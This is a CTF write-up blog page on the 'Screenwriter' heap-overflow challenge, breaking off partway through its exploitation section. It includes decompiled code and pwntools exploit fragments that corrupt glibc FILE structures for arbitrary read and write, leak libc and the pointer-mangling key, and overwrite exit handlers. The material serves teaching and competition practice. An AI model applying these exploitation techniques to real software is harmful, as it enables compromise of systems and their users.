@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="This is a medium binary exploitation challenge from the Wargames CTF 2024. It involves the usage of a heap overflow to exploit file structures, granting an arbitrary read and write primitive which was">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Screenwriter">
+<meta property="og:url" content="http://anthony-js.info/writeups/screenwriter/">
+<meta property="og:site_name" content="anthonyjs">
+<meta property="og:description" content="This is a medium binary exploitation challenge from the Wargames CTF 2024. It involves the usage of a heap overflow to exploit file structures, granting an arbitrary read and write primitive which was">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-01-02T04:11:17.952Z">
+<meta property="article:modified_time" content="2025-01-02T05:01:23.215Z">
+<meta property="article:author" content="anthonyjs">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Screenwriter</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/AnthonyMarrongelli/">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/writeups/prison_break/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://anthony-js.info/writeups/screenwriter/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://anthony-js.info/writeups/screenwriter/&text=Screenwriter"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://anthony-js.info/writeups/screenwriter/&title=Screenwriter"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://anthony-js.info/writeups/screenwriter/&is_video=false&description=Screenwriter"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Screenwriter&body=Check out this article: http://anthony-js.info/writeups/screenwriter/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://anthony-js.info/writeups/screenwriter/&title=Screenwriter"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://anthony-js.info/writeups/screenwriter/&title=Screenwriter"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://anthony-js.info/writeups/screenwriter/&title=Screenwriter"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://anthony-js.info/writeups/screenwriter/&title=Screenwriter"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://anthony-js.info/writeups/screenwriter/&name=Screenwriter&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://anthony-js.info/writeups/screenwriter/&t=Screenwriter"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Screenwriter"><span class="toc-number">1.</span> <span class="toc-text">Screenwriter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse-Engineering"><span class="toc-number">2.</span> <span class="toc-text">Reverse Engineering</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation"><span class="toc-number">3.</span> <span class="toc-text">Exploitation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Full-Exploit-Script"><span class="toc-number">4.</span> <span class="toc-text">Full Exploit Script</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Screenwriter
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">anthonyjs</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-01-02T04:11:17.952Z" class="dt-published" itemprop="datePublished">2025-01-01</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>This is a medium binary exploitation challenge from the Wargames CTF 2024. It involves the usage of a heap overflow to exploit file structures, granting an arbitrary read and write primitive which was used to overwrite the exit handlers.</p>
+<h2 id="Screenwriter"><a href="#Screenwriter" class="headerlink" title="Screenwriter"></a>Screenwriter</h2><p>Starting off this challenge, we’ll check out what we’re working with and then get some decompilation going.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">anthonyjs@frosty:~/screenwriter$ file chall &amp;&amp; checksec --file chall &amp;&amp; strings libc.so.6 | grep GNU</span><br><span class="line"></span><br><span class="line">chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-linux-x86-64.so.2, BuildID[sha1]=1d8800e6e15efea52b368e3320ac5cdd86834eae, for GNU/Linux 3.2.0, not stripped</span><br><span class="line"></span><br><span class="line">[*] &#x27;home/anthonyjs/screenwriter/chall&#x27;</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x3fe000)</span><br><span class="line">    RUNPATH:    b&#x27;./&#x27;</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">    Stripped:   No</span><br><span class="line"></span><br><span class="line">GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.1) stable release version 2.35.</span><br><span class="line">Compiled by GNU CC version 11.2.0.</span><br></pre></td></tr></table></figure>
+
+<p>All protections besides PIE are enabled. We are also working with libc 2.35 so we know that the common targets within this libc are things such as exit handlers and file structures. Let’s get reversing…</p>
+<h2 id="Reverse-Engineering"><a href="#Reverse-Engineering" class="headerlink" title="Reverse Engineering"></a>Reverse Engineering</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> choice; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+8h] [rbp-128h]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+10h] [rbp-120h]</span></span><br><span class="line">  FILE *s; <span class="comment">// [rsp+18h] [rbp-118h]</span></span><br><span class="line">  __int64 ptr; <span class="comment">// [rsp+20h] [rbp-110h] BYREF</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+28h] [rbp-108h]</span></span><br><span class="line">  <span class="type">char</span> v9[<span class="number">241</span>]; <span class="comment">// [rsp+30h] [rbp-100h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp+128h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  buf = <span class="built_in">malloc</span>(<span class="number">0x28</span>uLL);</span><br><span class="line">  stream = fopen(<span class="string">&quot;bee-movie.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  s = fopen(<span class="string">&quot;script.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to our latest screenwriting program!&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      choice = get_choice();</span><br><span class="line">      <span class="keyword">if</span> ( choice != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      ptr = <span class="number">0LL</span>;</span><br><span class="line">      v8 = <span class="number">0LL</span>;</span><br><span class="line">      v9[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">memset</span>(&amp;ptr, <span class="number">0</span>, <span class="number">0x11</span>uLL);</span><br><span class="line">      fread(&amp;ptr, <span class="number">1uLL</span>, <span class="number">0x10</span>uLL, stream);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;From the reference:&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>((<span class="type">const</span> <span class="type">char</span> *)&amp;ptr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( choice &gt; <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( choice == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;What&#x27;s your name: &quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">0x280</span>uLL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( choice != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      ptr = <span class="number">0LL</span>;</span><br><span class="line">      v8 = <span class="number">0LL</span>;</span><br><span class="line">      <span class="built_in">memset</span>(v9, <span class="number">0</span>, <span class="keyword">sizeof</span>(v9));</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Your masterpiece: &quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, &amp;ptr, <span class="number">0x100</span>uLL);</span><br><span class="line">      fwrite(&amp;ptr, <span class="number">1uLL</span>, <span class="number">0x100</span>uLL, s);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Goodbye %s&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)buf);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Here is the complete decompilation of the main function of this binary pulled from IDA. Couple of important things to pickout here. Let’s start with the heap overflow.</p>
+<p>Here we can see a chunk of size <code>0x28</code> be allocated and used as “<code>buff</code>“.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buf = <span class="built_in">malloc</span>(<span class="number">0x28</span>uLL);</span><br></pre></td></tr></table></figure>
+<p>Now further down in the code we can see the program reading <code>0x280</code> bytes into said buffer..</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(<span class="number">0</span>, buf, <span class="number">0x280</span>uLL);</span><br></pre></td></tr></table></figure>
+<p>Other than that, this could be a totally legit program. Something that you could see as a homework used in a computer science class at a university. Now this heap overflow because very useful to us for this reason:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">buf = <span class="built_in">malloc</span>(<span class="number">0x28</span>uLL);</span><br><span class="line">stream = fopen(<span class="string">&quot;bee-movie.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">s = fopen(<span class="string">&quot;script.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>Adjacent to our buffer chunk, we have these file structures. When you open a file with fopen, a file structure for said file is then placed onto the heap. So given that we have the ability to overwrite even a little bit (we can overwrite the entire thing) of the file structure, we can do some damage.</p>
+<p>Let me do some file structure explanation before we move forward.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;		<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_end;	<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line">  <span class="type">__off_t</span> _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>Here is the metadata associated with the file structure in libc. Normally a popular target for file structure programming is to take advantage of the vtable pointer inside the structure and modify it to get a call into <code>_IO_wdoallocbuf</code> to get <code>_IO_wfile_overflow</code> to get called. This involves modify wide data and even creating some fake structures within the correct memory range. Luckily for us we don’t need to do something that complex.</p>
+<p>We can abuse the file structures on the heap by doing some cool things. As you can see in the structure we have a tracker for reading:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *_IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line"><span class="type">char</span> *_IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line"><span class="type">char</span> *_IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br></pre></td></tr></table></figure>
+<p>Now if we were to overwrite the values here to pointers in memory that we want to read from, we totally could and we will!</p>
+<p>We could even use the structure to write to arbitrary memory as well!</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *_IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line"><span class="type">char</span> *_IO_buf_end;	<span class="comment">/* End of reserve area. */</span></span><br><span class="line">...</span><br><span class="line"><span class="type">int</span> _fileno;</span><br></pre></td></tr></table></figure>
+<p>Here is the metadata associated with that, and I included the <code>_fileno</code> which would even allow us to change the file descriptor that gets used. This will be important for later on when we want to write to memory, using this we can give the data we want to write from stdin.</p>
+<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>So first step that we want to take is getting our arbitrary read primitive. For this I loaded the binary into gdb and sent in a cyclic pattern to find the distance on the heap from our input buffer to the beginning of the first file structure. Doing so, I found the offset to be <code>48</code> bytes.</p>
+<p>From there, all I have to do is overwrite enough of the file structure to change the reading pointers to point to where I want to read. And given that PIE is disabled, I chose to read libc addresses from the GOT:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">addr, pad=<span class="number">0</span></span>):</span><br><span class="line">    payload = <span class="string">b&#x27;A&#x27;</span>*struct_one</span><br><span class="line">    payload += p64(<span class="number">0x00000000fbad2488</span>)</span><br><span class="line">    payload += p64(addr) + p64(addr+<span class="number">0x50</span>) + p64(addr)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Choice:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;name:&#x27;</span>, payload)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Choice:&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;From the reference:\n&#x27;</span>)</span><br><span class="line">    leak = u64(p.recv(<span class="number">8</span>-pad) + <span class="string">b&#x27;\x00&#x27;</span>*pad)</span><br><span class="line">    <span class="keyword">return</span> leak</span><br></pre></td></tr></table></figure>
+<p>In this chunk above, we are writing up to the first file structure, writing the correct flags that will allow us to read and more, then inputting the address we want to read, offseting the end pointer by an arbitrary amount of bytes (here I chose <code>0x50</code>), then putting the current ptr at the address.</p>
+<p>This makes it so that when we use the read call, it will then print out bytes from that address. The padding ability I added here was due to sometimes we are leaking something that is 6 bytes without null bytes or 8 bytes without null bytes. This padding feature allows us to use this leaking function for both.</p>
+<p>Now we are halfway there, we can leak things. I intended to attack the exit handlers when I got up to this part of the challenges, so I walked through the <code>handle_exit_funcs</code> function to see what functions were lined up, and after the exit handler pointer inside of the libc memory space was demangled, it was discovered that the function that was being called resides in the linkers memory space.</p>
+<p>To be able to bypass the checks needed to overwrite a exit handler, we need to mangle the function pointer we want to right with the correct key that the program uses. The easy way I found to leak this key is to leak an already mangled pointer, the pointer unmangled, and do the calculations from there to find the key.</p>
+<p>Knowing that, we will need to leak libc memory base, the mangled pointer, and linker memory base:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># rebase libc</span></span><br><span class="line">puts = leak(elf.got[<span class="string">&#x27;puts&#x27;</span>], <span class="number">2</span>)</span><br><span class="line">libc.address = puts - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak the exit handler stuff (it leaks a pointer mangled that is a ld ptr)</span></span><br><span class="line">handler_target = libc.address + <span class="number">0x21af18</span></span><br><span class="line">handler_leak = leak(handler_target)</span><br><span class="line">log.info(<span class="built_in">hex</span>(handler_leak))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leaking ld</span></span><br><span class="line">linker_leak = leak(libc.address + <span class="number">0x219178</span>, <span class="number">2</span>) - <span class="number">0x17dd0</span></span><br><span class="line">log.info(<span class="built_in">hex</span>(linker_leak))</span><br></pre></td></tr></table></figure>
+<p>After doing so we can now calculate that mangling key. I’m going to include some assembly that shows exactly how a exit handler pointer gets demangled:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000039fc1 &lt;+177&gt;: ror    rdx,0x11</span><br><span class="line">0x0000000000039fc5 &lt;+181&gt;: xor    rdx,QWORD PTR fs:0x30</span><br></pre></td></tr></table></figure>
+<p>Note that this is not from this exact binary but is the same calculations done. I pulled this from <a target="_blank" rel="noopener" href="https://binholic.blogspot.com/2017/05/notes-on-abusing-exit-handlers.html">here</a> for ease of access.</p>
+<p>So to calculate that mangling key it comes down to <code>ror</code> the leaked address by <code>0x11</code> then xoring that with the unmangled address pointer:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># calculate mangle key</span></span><br><span class="line">leaked_value = linker_leak + <span class="number">0x6040</span></span><br><span class="line">key = ror_64(handler_leak, <span class="number">0x11</span>)^(leaked_value)</span><br><span class="line">log.info(<span class="built_in">hex</span>(key))</span><br></pre></td></tr></table></figure>
+
+<p>So awesome. From there we can simply just write the address of the function we want to execute into the exit handlers memory space. And typically this will want to be <code>system</code>. To achieve the write we will use pwntools handy file structure exploitation tools:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># use file structure to write to exit handler</span></span><br><span class="line">fp = FileStructure()</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*struct_one</span><br><span class="line">payload += fp.read(handler_target, <span class="number">0x20</span>) + p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Choice:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;name:&#x27;</span>, payload)</span><br></pre></td></tr></table></figure>
+<p>Now you might be questioning what this is doing. Again we are overwriting the file structure, but under the hood, this fp.read() call does something very simple. I will show you exactly what it does. Say we wanted to read from address <code>0xdeadbeef</code>. We call <code>fp.read(0xdeadbeef, 0x20)</code>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&#123; </span><br><span class="line"> flags: <span class="number">0x0</span></span><br><span class="line"> _IO_read_ptr: <span class="number">0x0</span></span><br><span class="line"> _IO_read_end: <span class="number">0x0</span></span><br><span class="line"> _IO_read_base: <span class="number">0x0</span></span><br><span class="line"> _IO_write_base: <span class="number">0x0</span></span><br><span class="line"> _IO_write_ptr: <span class="number">0x0</span></span><br><span class="line"> _IO_write_end: <span class="number">0x0</span></span><br><span class="line"> _IO_buf_base: <span class="number">0xdeadbeef</span></span><br><span class="line"> _IO_buf_end: <span class="number">0xdeadbf0f</span></span><br><span class="line"> _IO_save_base: <span class="number">0x0</span></span><br><span class="line"> _IO_backup_base: <span class="number">0x0</span></span><br><span class="line"> _IO_save_end: <span class="number">0x0</span></span><br><span class="line"> markers: <span class="number">0x0</span></span><br><span class="line"> chain: <span class="number">0x0</span></span><br><span class="line"> fileno: <span class="number">0x0</span></span><br><span class="line"> _flags2: <span class="number">0x0</span></span><br><span class="line"> _old_offset: <span class="number">0xffffffff</span></span><br><span class="line"> _cur_column: <span class="number">0x0</span></span><br><span class="line"> _vtable_offset: <span class="number">0x0</span></span><br><span class="line"> _shortbuf: <span class="number">0x0</span></span><br><span class="line"> unknown1: <span class="number">0x0</span></span><br><span class="line"> _lock: <span class="number">0x0</span></span><br><span class="line"> _offset: <span class="number">0xffffffffffffffff</span></span><br><span class="line"> 